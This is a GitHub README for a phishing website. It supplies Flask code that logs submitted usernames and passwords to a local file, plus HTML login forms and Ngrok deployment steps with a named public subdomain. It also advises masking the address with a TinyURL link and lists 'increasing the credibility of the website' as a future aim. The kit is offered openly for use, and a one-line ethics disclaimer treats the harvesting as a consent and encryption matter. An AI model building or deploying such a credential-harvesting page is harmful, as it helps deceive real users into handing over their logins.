# Project: Phishing website using Flask and Ngrok

## Overview
This repository contains a Flask-based website that implements a simple login functionality. The website allows users to submit login credentials through a web interface and processes the data on the backend. The website is deployed online using Ngrok. This project serves as an example on how to gather user information through a malicious web page login form that saves user data into a local text file.

## Features
- **Frontend:** A simple HTML interface for user login.
- **Backend:** Flask website handling routing and processing login credentials.
- **Logging:** Captures and stores submitted login credentials in a local file (`pwned.txt`).
- **Deployment:** Uses Ngrok to expose the Flask website to the internet.

---

## Project Structure
```
project-directory/
├── static/          # CSS, JavaScript, and other static files
├── templates/       # HTML files (index.html, login.html)
├── server.py        # Main Flask website
├── pwned.txt        # File for logging submitted credentials
└── README.md        # Documentation
```

### File Details
- **`index.html`**: The main landing page for the website.
- **`login.html`**: Contains the login form where users can enter their credentials.
- **`server.py`**: Python script for:
  - Rendering the HTML pages.
  - Handling login form submissions.
  - Writing submitted credentials to `pwned.txt`.
- **`pwned.txt`**: Stores the username and password entries submitted by users.

---

## Setup and Installation

### Prerequisites
- Python (3.12 or above)
- Ngrok (to expose the Flask app online)

### Steps
1. Clone the repository:
   ```bash
   git clone https://github.com/elvishaveriku/Phishing_Website_Project.git
   cd phishing_website_project
   ```

2. Install the required Python packages:
   ```bash
   pip install flask
   ```

3. Run the Flask website:
   ```bash
   python server.py
   ```

4. Start Ngrok to expose the website:
   ```bash
   ngrok http --url=badly-climbing-loon.ngrok-free.app 5000
   ```
   Copy the public URL generated by Ngrok.

6. Access the website in your browser using the Ngrok URL.

Default URL is: badly-climbing-loon.ngrok-free.app .

We can use Tinyurl to mask the default URL. New URL is: https://tinyurl.com/3dyd3n96

![image](https://github.com/user-attachments/assets/27fe6355-89fa-4787-b2f7-91b7799017e2)

   
7. Entering credentials in the login page.

![image](https://github.com/user-attachments/assets/b7f2113c-ec58-409b-90c5-f09c2c403ac4)


8. After clicking Login" check the newly created "pwned.txt" file in your local machine.

![image](https://github.com/user-attachments/assets/2eae7fa1-34b4-49c4-995d-f79f58ea2775)


---

## Code Highlights

### Flask Routes
- **Index Route (`/`)**:
  Serves the `index.html` page.
  ```python
  @app.route('/')
  def index():
      return render_template('index.html')
  ```

- **Login Page (`/login.html`)**:
  Serves the `login.html` page.
  ```python
  @app.route('/login.html')
  def login():
      return render_template('login.html')
  ```

- **Login Submission (`/login`)**:
  Handles the login form submission and logs credentials.
  ```python
  @app.route('/login', methods=['POST'])
  def handle_login():
      username = request.form.get('username')
      password = request.form.get('password')

      with open('pwned.txt', 'a') as file:
          file.write(f"Username: {username}, Password: {password}\n")

      if username == 'admin' and password == 'password123':
          return jsonify({'message': 'Login successful!'}), 200
      else:
          return jsonify({'message': 'Invalid credentials.'}), 400
  ```
  
---

## Frontend Implementation

### HTML Structure
The frontend consists of two HTML pages: `index.html` and `login.html`. Both are located in the `templates/` directory.

#### `index.html`
A simple landing page with navigation links.
```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Home Page</title>
</head>
<body>
    <header>
        <h1>Welcome to the Web App</h1>
    </header>
    <nav>
        <ul>
            <li><a href="/">Home</a></li>
            <li><a href="/login.html">Login</a></li>
        </ul>
    </nav>
</body>
</html>
```

#### `login.html`
A form for users to submit login credentials.
```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login Page</title>
</head>
<body>
    <header>
        <h1>Login</h1>
    </header>
    <main>
        <form id="loginForm" action="/login" method="POST">
            <label for="username">Username:</label>
            <input type="text" id="username" name="username" required>
            <br>
            <label for="password">Password:</label>
            <input type="password" id="password" name="password" required>
            <br>
            <button type="submit">Login</button>
        </form>
    </main>
</body>
</html>
```

---

## Ethical Considerations
Logging sensitive user information is for demonstration purposes only. Do not deploy such functionality in production without proper security measures, including encryption and user consent.

---

## Future Improvements
- Increasing the credibility of the website

---

## Author
[Elvis Haveriku] - Cybersecurity enthusiast and passionate about web technologies and Python programming.

